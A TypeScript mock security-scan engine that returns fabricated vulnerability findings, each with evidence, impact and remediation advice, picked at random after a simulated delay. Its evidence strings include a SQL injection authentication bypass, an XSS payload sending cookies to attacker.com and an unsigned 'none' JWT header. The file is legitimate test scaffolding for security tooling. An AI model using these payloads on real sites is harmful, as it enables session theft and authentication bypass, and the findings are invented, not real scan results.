import { ISecurityEngine, ScanConfig, ScanResult, ScanFinding } from '../interfaces/ISecurityEngine';

const MOCK_FINDINGS: ScanFinding[] = [
  {
    title: 'SQL Injection in Login Endpoint',
    severity: 'critical',
    description: 'The login endpoint is vulnerable to SQL injection. An attacker can bypass authentication or dump the database by injecting SQL syntax into the username parameter.',
    affectedEndpoint: 'POST /api/auth/login',
    evidence: "Parameter: username\nPayload: admin' OR '1'='1'--\nResponse: 200 OK with admin JWT token",
    impact: 'Full database compromise, authentication bypass, data exfiltration of all user records.',
    recommendation: 'Use parameterized queries or a query builder. Never concatenate user input into SQL strings. Implement WAF rules for SQL injection patterns.'
  },
  {
    title: 'Reflected Cross-Site Scripting (XSS)',
    severity: 'high',
    description: 'The search parameter is reflected into the response HTML without proper encoding, enabling reflected XSS attacks.',
    affectedEndpoint: 'GET /search?q=',
    evidence: "Payload: <script>document.location='https://attacker.com/steal?c='+document.cookie</script>\nResponse: Payload reflected in page without encoding",
    impact: 'Session hijacking, credential theft, phishing attacks, malware distribution.',
    recommendation: 'HTML-encode all user-supplied data before reflecting in responses. Implement a strict Content Security Policy (CSP) header.'
  },
  {
    title: 'Insecure Direct Object Reference (IDOR)',
    severity: 'high',
    description: 'User profile data can be accessed by modifying the user ID in the URL path without any authorization check.',
    affectedEndpoint: 'GET /api/users/:id',
    evidence: 'User with ID 1001 can access profile of user 1002 by changing URL parameter. No authorization check performed.',
    impact: 'Unauthorized access to other users personal data, PII exposure.',
    recommendation: 'Implement proper authorization checks on all data access. Use indirect object references. Verify that the requesting user has permission to access the requested resource.'
  },
  {
    title: 'Missing Security Headers',
    severity: 'medium',
    description: 'The application is missing several security-relevant HTTP response headers that protect against common client-side attacks.',
    affectedEndpoint: 'All endpoints',
    evidence: 'Missing headers: X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, Content-Security-Policy',
    impact: 'Increased attack surface for clickjacking, MIME sniffing, and downgrade attacks.',
    recommendation: 'Add security headers: X-Frame-Options: DENY, X-Content-Type-Options: nosniff, HSTS with max-age >= 31536000, a strict CSP.'
  },
  {
    title: 'Verbose Error Messages Exposing Stack Traces',
    severity: 'low',
    description: 'The application returns full stack traces in error responses, revealing internal implementation details.',
    affectedEndpoint: 'GET /api/items/invalid-id',
    evidence: 'HTTP 500 response body contains: "at Database.query (/app/src/db/index.js:45:12)\n  at Object.<anonymous> (/app/src/controllers/items.js:23:8)"',
    impact: 'Information disclosure aids attackers in understanding application internals, facilitating targeted attacks.',
    recommendation: 'Return generic error messages to clients. Log full error details server-side only. Implement a global error handler.'
  },
  {
    title: 'JWT Algorithm Confusion (none algorithm)',
    severity: 'critical',
    description: 'The JWT validation does not enforce a specific algorithm, accepting tokens signed with the "none" algorithm.',
    affectedEndpoint: 'All authenticated endpoints',
    evidence: 'Modified JWT header: {"alg":"none","typ":"JWT"}\nServer accepted unsigned token and returned admin data.',
    impact: 'Complete authentication bypass, privilege escalation to any user including admin.',
    recommendation: 'Enforce a strict algorithm whitelist in JWT validation. Never accept the "none" algorithm. Use a well-maintained JWT library.'
  },
  {
    title: 'Insecure CORS Configuration',
    severity: 'medium',
    description: 'The API allows cross-origin requests from any origin with credentials enabled.',
    affectedEndpoint: 'All API endpoints',
    evidence: 'Response headers: Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true',
    impact: 'Cross-site request forgery, data theft from authenticated users via malicious third-party sites.',
    recommendation: 'Configure CORS to only allow specific trusted domains. Never combine wildcard origin with credentials.'
  },
  {
    title: 'No Rate Limiting on Authentication Endpoints',
    severity: 'medium',
    description: 'Authentication endpoints have no rate limiting, enabling brute-force and credential stuffing attacks.',
    affectedEndpoint: 'POST /api/auth/login, POST /api/auth/reset-password',
    evidence: '10,000 requests in 60 seconds returned all 200/401 status codes without lockout or throttling.',
    impact: 'Account takeover via brute-force attacks against weak passwords.',
    recommendation: 'Implement rate limiting (max 5 failed attempts per 15 min per IP). Add exponential backoff. Implement CAPTCHA after failed attempts.'
  }
];

export class MockSecurityEngine implements ISecurityEngine {
  async runScan(config: ScanConfig): Promise<ScanResult> {
    const delayMs = config.intensity === 'light' ? 2000 : config.intensity === 'standard' ? 5000 : 10000;
    
    await new Promise(resolve => setTimeout(resolve, delayMs));

    const numFindings = config.scanMode === 'full' ? 
      Math.floor(Math.random() * 4) + 5 :  // 5-8 for full
      Math.floor(Math.random() * 3) + 2;   // 2-4 for specific

    const shuffled = [...MOCK_FINDINGS].sort(() => Math.random() - 0.5);
    const findings = shuffled.slice(0, numFindings).map(f => ({
      ...f,
      affectedEndpoint: f.affectedEndpoint.replace(':id', String(Math.floor(Math.random() * 9999) + 1000))
    }));

    return {
      findings,
      duration: delayMs / 1000,
      testsRun: config.tests.length || 24
    };
  }
}
